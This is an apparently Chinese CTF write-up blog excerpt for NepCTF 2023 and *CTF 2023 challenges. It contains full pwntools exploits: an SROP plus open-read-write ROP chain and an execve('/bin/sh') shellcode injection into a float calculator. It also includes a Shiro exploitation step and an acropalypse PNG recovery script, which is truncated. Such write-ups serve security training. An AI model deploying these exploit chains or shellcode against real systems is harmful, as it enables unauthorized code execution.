class="string">&#x27;08b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Decode the compressed data using the Huffman tree</span></span><br><span class="line">    decoded_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    node = root</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> compressed_data:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            node = node.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node = node.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            decoded_data += <span class="built_in">chr</span>(node.char)</span><br><span class="line">            node = root</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the decompressed data to the output file</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&#x27;input.txt&#x27;</span></span><br><span class="line">    compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">    decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 压缩文件</span></span><br><span class="line">    <span class="comment"># compress(input_file, compressed_file)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压缩文件</span></span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br></pre></td></tr></table></figure><p><img src="/img/Nepctf2023/9.png" alt="image-20230813234616952"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web:"></a>Web:</h2><h3 id="ez-java-checkin："><a href="#ez-java-checkin：" class="headerlink" title="ez_java_checkin："></a>ez_java_checkin：</h3><p>burpsuit抓包能看到有个rememberme，直接网上搜，说是可能shiro漏洞，直接安装一个自动化工具命令执行。自动化工具一把梭哈（不过构造链构造一半就断了只能手动构造。。。）：</p><p><img src="/img/Nepctf2023/10.png" alt="image-20230813201653819"></p><p><img src="/img/Nepctf2023/10(1).png" alt="image-20230813201728655"></p><p>不能直接cat &#x2F;flag，只能cat其他的看看，最后在start.sh找到flag：<br><img src="/img/Nepctf2023/11.png" alt="image-20230813201802555"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn:"></a>Pwn:</h2><h3 id="HRP-CHAT-3"><a href="#HRP-CHAT-3" class="headerlink" title="HRP-CHAT-3:"></a>HRP-CHAT-3:</h3><p>查看源码可以看到拿到H3h3QAQ这个角色，然后使用1技能就能把boss的血打成负数拿flag，直接RollCard抽到”H3h3QAQ“就可以了：</p><p><img src="/img/Nepctf2023/12.png" alt="image-20230813201802555"></p><h3 id="srop："><a href="#srop：" class="headerlink" title="srop："></a>srop：</h3><p>题目写着srop,而且有个”mov rax,0xf“（虽然没啥用），所以得知得使用srop，然后开了沙箱，得使用orw（半夜做的，exp写得有点乱，请见谅）</p><p>先使用栈迁移跳转到一个可写段，以便后续可以控制rsp的值</p><p>跳转过去后使用srop构造write（1,syscall_got,0x30）泄露libc基地址，要注意的是syscall_plt会将rdi赋值给rax，所以将rdi赋值为0xf即可触发srop，泄露后再返回那个可写段构造orw即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">p=process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">30689</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> a:p.send(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a:p.sendline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x40078D</span></span><br><span class="line">syscall_addr=<span class="number">0x400751</span></span><br><span class="line">rdi=<span class="number">0x0000000000400813</span></span><br><span class="line">ret=<span class="number">0x000000000040056e</span></span><br><span class="line">syscall_got=elf.got[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">syscall_plt=elf.plt[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdx=<span class="number">0x601200</span></span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*0x38+p64(rdi)+p64(0xf)+p64(syscall_plt)+bytes(frame)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(rdx+<span class="number">0x20</span>)+p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sla(<span class="string">&#x27;NepCTF2023!\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;syscall:&#x27;</span>+<span class="built_in">hex</span>(syscall_got))</span><br><span class="line">syscall_ret=<span class="number">0x4007A8</span></span><br><span class="line">target_addr=<span class="number">0x40075B</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rsi=<span class="number">1</span>  </span><br><span class="line">frame.rdi=<span class="number">1</span>  </span><br><span class="line">frame.rdx=syscall_got  </span><br><span class="line">frame.rcx=<span class="number">0x30</span>  </span><br><span class="line">frame.rip=syscall_plt</span><br><span class="line">frame.rsp=<span class="number">0x601200</span> </span><br><span class="line">frame.rbp=<span class="number">0x601220</span> </span><br><span class="line"></span><br><span class="line">payload=p64(main)*<span class="number">4</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(rdx+<span class="number">0x20</span>)+p64(rdi)+p64(<span class="number">0xf</span>)+p64(syscall_plt)+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sl(payload)</span><br><span class="line">syscall_addr=get_libc()</span><br><span class="line">libc_base=syscall_addr-libc.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">flag_addr=<span class="number">0x6011f8</span></span><br><span class="line">read=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;read:&#x27;</span>+<span class="built_in">hex</span>(read))</span><br><span class="line">success(<span class="string">&#x27;write：&#x27;</span>+<span class="built_in">hex</span>(write))</span><br><span class="line">success(<span class="string">&#x27;open_addr:&#x27;</span>+<span class="built_in">hex</span>(open_addr))</span><br><span class="line">rax=libc_base+<span class="number">0x000000000001b500</span></span><br><span class="line">rsi=libc_base+<span class="number">0x0000000000023a6a</span></span><br><span class="line">rdx=libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">syscall=libc_base+<span class="number">1160503</span></span><br><span class="line"><span class="comment">#rdi=libc_base+0x000000000002164f</span></span><br><span class="line">payload1=<span class="string">b&#x27;./flag\x00\x00&#x27;</span>*<span class="number">2</span>+p64(rax)+p64(<span class="number">2</span>)+p64(rdi)+p64(flag_addr)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)+p64(syscall)+p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(<span class="number">0x601100</span>)+p64(rdx)+p64(<span class="number">0x50</span>)+p64(rax)+p64(<span class="number">0</span>)+p64(syscall)+p64(rdi)+p64(<span class="number">1</span>)+p64(rax)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sl(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/Nepctf2023/13.png" alt="image-20230813201802555"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>⭐ctf2023 部分wp</title>
      <link href="/2023/07/29/%E6%98%9Fctf2023wp/"/>
      <url>/2023/07/29/%E6%98%9Fctf2023wp/</url>
      
        <content type="html"><![CDATA[<p><strong>emmmm，做了三道签到题就做不动了</strong></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h3><p>pwn的签到题？简单写写思路</p><p>逻辑不难，模拟1-100的浮点数的加减乘除，然后栈可执行：</p><p><img src="/img/%E6%98%9Fctf_wp/1.png" alt="image-20230729173700154"></p><p>明显栈上写shellcode，想办法跳到shellcode执行</p><p>先解决第一步：如何跳到shellcode执行</p><h4 id="跳到shellcode："><a href="#跳到shellcode：" class="headerlink" title="跳到shellcode："></a>跳到shellcode：</h4><p>通过逆向分析加调试，加减乘除的函数地址放在这里，而最后<strong>0x5555555580e0</strong>这里还存储着输入浮点数的位置</p><p><img src="/img/%E6%98%9Fctf_wp/2.png" alt="image-20230729173832564"></p><p>这里执行输入+、-、*、&#x2F;，如果我们输入“0”，既能符合前面的判断，也能执行<strong>0x5555555580e0</strong>这里的地址，所以就可以跳到shellcode执行</p><p><img src="/img/%E6%98%9Fctf_wp/3.png" alt="image-20230729174003930"></p><h4 id="写入shellcode："><a href="#写入shellcode：" class="headerlink" title="写入shellcode："></a>写入shellcode：</h4><p>通过gdb调试可以知道填充0x38个字节后就能到存储小数的位置：</p><p><img src="/img/%E6%98%9Fctf_wp/4.png" alt="image-20230729175441229"></p><p>所以第一次写入超长的小数并带入shellcode，小数长度要0x48，因为需要写入两个小数，总共占用了0x10个字节，写到这本来以为再写入个小数，写入个“0”就完成了，运行后不通才发现它还检测了存储小数的<strong>所有</strong>位置要满足大于1小于100，这就使得直接生成的shellcode不满足这个条件，后面网上查了一下，1-100的范围为：3FF0000000000000-4059000000000000</p><p><img src="/img/%E6%98%9Fctf_wp/5.png" alt="image-20230729180032523"></p><p><img src="/img/%E6%98%9Fctf_wp/6.png" alt="image-20230729180051055"></p><p>所以主要控制最高字节和次高字节在3FF0-4059之间即可</p><p>由于mov rdi 0x68732f2f6e69622f，这个转换过来的机器码太长了，所以打算在第一次小数中顺便填充进“&#x2F;bin&#x2F;sh”，这里本来是不符合小数的，但它的检测只检测了前0x30个字节，所以后面可以填充进来</p><p>先写个shellcode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,rsi</span><br><span class="line">add rdi,0x32</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov eax,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>在线网站转换一下：</p><p><img src="/img/%E6%98%9Fctf_wp/7.png" alt="image-20230729180504549"></p><p>然后每条汇编指令前面填充\x90（nop的机器码），最后两个字节填充 ‘ \x40 ’（好像是rex的机器码，最开始抱着试一下看看怎么样，发现这里不会将其识别为汇编指令，其他的都能正常识别并执行）</p><p>最后exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./fcalc&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">56530</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fcalc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">s = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">uu64=<span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">get_libc = <span class="keyword">lambda</span> :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">plo = <span class="keyword">lambda</span> o:p64(libc_base+o)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rsi</span></span><br><span class="line"><span class="string">add rdi,0x32</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov eax,0x3b</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=(<span class="string">b&#x27;2.&#x27;</span>).ljust(<span class="number">0x32</span>,<span class="string">b&#x27;2&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;2&#x27;</span>*<span class="number">22</span>+<span class="string">b&#x27;\x48\x89\xF7\x90\x90\x90\x40\x40&#x27;</span>+<span class="string">b&#x27;\x48\x83\xC7\x32\x90\x90\x40\x40&#x27;</span>+<span class="string">b&#x27;\x48\x31\xf6\x48\x31\xd2\x40\x40&#x27;</span>+<span class="string">b&#x27;\xB8\x3B\x00\x00\x00\x90\x40\x40&#x27;</span>+<span class="string">b&#x27;\x0F\x05\x90\x90\x90\x90\x40\x40&#x27;</span></span><br><span class="line">sa(<span class="string">&#x27;expression:\n&#x27;</span>,payload)</span><br><span class="line">sl(<span class="string">b&#x27;1.2&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag如下：</p><p><img src="/img/%E6%98%9Fctf_wp/6%EF%BC%881%EF%BC%89.png" alt="image-20230729191609224"></p><p><strong>注意的坑点</strong>：输入shellcode的时候不能输入换行符，后面判断也会判断到换行符不是小数。。。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h3><p>谷歌识图：</p><p><img src="/img/%E6%98%9Fctf_wp/8.png" alt="image-20230729101629873"></p><p>第一个，dovahkiin字体，搜一下</p><p><img src="/img/%E6%98%9Fctf_wp/9.png" alt="image-20230729101659122"></p><p>对照一下写出来即可：</p><p>GIKRVZY  （有个坑人的地方，k和c是一样的）</p><h3 id="sinppingTools"><a href="#sinppingTools" class="headerlink" title="sinppingTools"></a>sinppingTools</h3><p>网上查找了解到是cve-2023-28303漏洞，同时找到了脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;USAGE: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> orig_width orig_height cropped.png reconstructed.png&quot;</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">PNG_MAGIC = <span class="string">b&quot;\x89PNG\r\n\x1a\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_png_chunk</span>(<span class="params">stream</span>):</span><br><span class="line">size = <span class="built_in">int</span>.from_bytes(stream.read(<span class="number">4</span>), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">ctype = stream.read(<span class="number">4</span>)</span><br><span class="line">body = stream.read(size)</span><br><span class="line">csum = <span class="built_in">int</span>.from_bytes(stream.read(<span class="number">4</span>), <span class="string">&quot;big&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(zlib.crc32(ctype + body) == csum)</span><br><span class="line"><span class="keyword">return</span> ctype, body</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_png_chunk</span>(<span class="params">stream, name, body</span>):</span><br><span class="line">stream.write(<span class="built_in">len</span>(body).to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>))</span><br><span class="line">stream.write(name)</span><br><span class="line">stream.write(body)</span><br><span class="line">crc = zlib.crc32(body, zlib.crc32(name))</span><br><span class="line">stream.write(crc.to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>))</span><br><span class="line"></span><br><span class="line">orig_width = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">orig_height = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">f_in = <span class="built_in">open</span>(sys.argv[<span class="number">3</span>], <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">magic = f_in.read(<span class="built_in">len</span>(PNG_MAGIC))</span><br><span class="line"><span class="keyword">assert</span>(magic == PNG_MAGIC)</span><br><span class="line"></span><br><span class="line"><span class="comment"># find end of cropped PNG</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">ctype, body = parse_png_chunk(f_in)</span><br><span class="line"><span class="keyword">if</span> ctype == <span class="string">b&quot;IEND&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># grab the trailing data</span></span><br><span class="line">trailer = f_in.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found <span class="subst">&#123;<span class="built_in">len</span>(trailer)&#125;</span> trailing bytes!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># find the start of the nex idat chunk</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">next_idat = trailer.index(<span class="string">b&quot;IDAT&quot;</span>, <span class="number">12</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;No trailing IDATs found :(&quot;</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># skip first 12 bytes in case they were part of a chunk boundary</span></span><br><span class="line">idat = trailer[<span class="number">12</span>:next_idat-<span class="number">8</span>] <span class="comment"># last 8 bytes are crc32, next chunk len</span></span><br><span class="line"></span><br><span class="line">stream = io.BytesIO(trailer[next_idat-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">ctype, body = parse_png_chunk(stream)</span><br><span class="line"><span class="keyword">if</span> ctype == <span class="string">b&quot;IDAT&quot;</span>:</span><br><span class="line">idat += body</span><br><span class="line"><span class="keyword">elif</span> ctype == <span class="string">b&quot;IEND&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&quot;Unexpected chunk type: &quot;</span> + <span class="built_in">repr</span>(ctype))</span><br><span class="line"></span><br><span class="line">idat = idat[:-<span class="number">4</span>] <span class="comment"># slice off the adler32</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Extracted <span class="subst">&#123;<span class="built_in">len</span>(idat)&#125;</span> bytes of idat!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;building bitstream...&quot;</span>)</span><br><span class="line">bitstream = []</span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> idat:</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">bitstream.append((byte &gt;&gt; bit) &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add some padding so we don&#x27;t lose any bits</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">bitstream.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;reconstructing bit-shifted bytestreams...&quot;</span>)</span><br><span class="line">byte_offsets = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">shifted_bytestream = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(bitstream)-<span class="number">7</span>, <span class="number">8</span>):</span><br><span class="line">val = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">val |= bitstream[j+k] &lt;&lt; k</span><br><span class="line">shifted_bytestream.append(val)</span><br><span class="line">byte_offsets.append(<span class="built_in">bytes</span>(shifted_bytestream))</span><br><span class="line"></span><br><span class="line"><span class="comment"># bit wrangling sanity checks</span></span><br><span class="line"><span class="keyword">assert</span>(byte_offsets[<span class="number">0</span>] == idat)</span><br><span class="line"><span class="keyword">assert</span>(byte_offsets[<span class="number">1</span>] != idat)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scanning for viable parses...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prefix the stream with 32k of &quot;X&quot; so backrefs can work</span></span><br><span class="line">prefix = <span class="string">b&quot;\x00&quot;</span> + (<span class="number">0x8000</span>).to_bytes(<span class="number">2</span>, <span class="string">&quot;little&quot;</span>) + (<span class="number">0x8000</span> ^ <span class="number">0xffff</span>).to_bytes(<span 